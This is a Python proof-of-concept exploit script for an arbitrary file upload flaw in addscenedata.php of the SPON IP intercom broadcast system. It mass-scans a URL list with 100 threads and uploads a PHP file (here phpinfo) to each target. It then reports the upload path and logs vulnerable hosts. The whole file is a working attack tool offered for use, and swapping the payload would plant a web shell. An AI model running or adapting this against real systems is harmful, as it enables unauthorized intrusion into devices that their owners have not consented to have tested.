import requests,re,argparse,os,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''
███████╗██╗  ██╗████████╗██╗  ██╗     ███████╗██████╗  ██████╗ ███╗   ██╗    ██╗██████╗ 
██╔════╝██║  ██║╚══██╔══╝╚██╗██╔╝     ██╔════╝██╔══██╗██╔═══██╗████╗  ██║    ██║██╔══██╗
███████╗███████║   ██║    ╚███╔╝█████╗███████╗██████╔╝██║   ██║██╔██╗ ██║    ██║██████╔╝
╚════██║██╔══██║   ██║    ██╔██╗╚════╝╚════██║██╔═══╝ ██║   ██║██║╚██╗██║    ██║██╔═══╝ 
███████║██║  ██║   ██║   ██╔╝ ██╗     ███████║██║     ╚██████╔╝██║ ╚████║    ██║██║     
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝     ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝    ╚═╝╚═╝     
                                                                                                                        
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="世邦通信 SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
        
def poc(target):
    payload = "/php/addscenedata.php"
    url = target+payload
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close",
        "Content-Length": "264",
            }
    data = (
        "--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b\r\n"
        'Content-Disposition: form-data; name="upload"; filename="test.php"\r\n'
        'Content-Type: application/octet-stream\r\n'
        "\r\n"
        "<?php phpinfo();?>\r\n"
        '--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b--\r\n'
    )
    try:
        res = requests.get(url=target,verify=False,timeout=10)
        if res.status_code == 200:
            res1 = requests.post(url=url,headers=header,data=data,verify=False,timeout=10)
            result = target+"/images/scene/test.php"
            if  '"res":"1"' in res1.text and res1.status_code == 200:
                print(f"[+]此url{target}存在漏洞\r\n上传后的url为{result}")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n') 
            else:
                print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试"+e)
if __name__ ==  '__main__':
    main()
